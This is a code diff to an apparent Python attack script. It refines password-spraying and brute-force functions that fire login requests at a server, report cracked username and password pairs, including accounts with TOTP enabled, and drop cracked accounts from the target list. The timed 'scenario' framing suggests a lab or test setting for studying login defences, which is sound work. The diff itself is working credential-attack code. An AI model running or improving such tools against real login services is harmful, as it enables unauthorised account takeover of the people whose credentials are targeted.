@@ -129,8 +129,16 @@ def password_spraying(
     if start_time is None:
         start_time = time.time()
 
+    # Create mutable copy of usernames list
+    remaining_users = list(usernames)
+
     # Try each password against all users
     for password in passwords:
+        # Check if all users have been cracked
+        if not remaining_users:
+            print(f"\n[+] All users cracked! No more targets remaining.")
+            break
+
         # Check if timeout exceeded
         elapsed_time = time.time() - start_time
         if elapsed_time >= timeout_seconds:
@@ -139,8 +147,10 @@ def password_spraying(
             return elapsed_time
 
         print(f"\n[*] Trying password: '{password}' (Elapsed: {elapsed_time:.1f}s)")
+        print(f"[*] Remaining targets: {len(remaining_users)}")
 
-        for username in usernames:
+        # Iterate over a copy to allow modification during iteration
+        for username in list(remaining_users):
             # Check timeout before each attempt
             elapsed_time = time.time() - start_time
             if elapsed_time >= timeout_seconds:
@@ -168,8 +178,12 @@ def password_spraying(
                     data = final_response.json()
                     if data.get("status") == "success":
                         print(f"[+] SUCCESS! Username: '{username}' Password: '{password}'")
+                        remaining_users.remove(username)
+                        print(f"[*] Removed '{username}' from target list")
                     elif data.get("totp_required"):
                         print(f"[+] PASSWORD FOUND! Username: '{username}' Password: '{password}' (TOTP enabled)")
+                        remaining_users.remove(username)
+                        print(f"[*] Removed '{username}' from target list")
 
             except requests.exceptions.RequestException as e:
                 print(f"[!] Error connecting to server: {e}")
@@ -215,15 +229,20 @@ def brute_force_attack(
 
     login_url = f"{server_url}{endpoint}"
 
+    session = requests.Session()
+    if start_time is None:
+        start_time = time.time()
+
+    # Calculate remaining time from scenario start
+    elapsed_from_scenario = time.time() - start_time
+    remaining_time = max(0, timeout_seconds - elapsed_from_scenario)
+
     print(f"[*] Starting brute force attack")
     print(f"[*] Target: {server_url}")
     print(f"[*] Target username: '{target_username}'")
     print(f"[*] Password list size: {len(password_list)}")
-    print(f"[*] Attack timeout: {timeout_seconds} seconds ({timeout_seconds / 60:.1f} minutes)")
+    print(f"[*] Attack timeout: {remaining_time:.1f} seconds ({remaining_time / 60:.1f} minutes) [remaining from scenario]")
 
-    session = requests.Session()
-    if start_time is None:
-        start_time = time.time()
     attempts = 0
 
     for i, password in enumerate(password_list, 1):
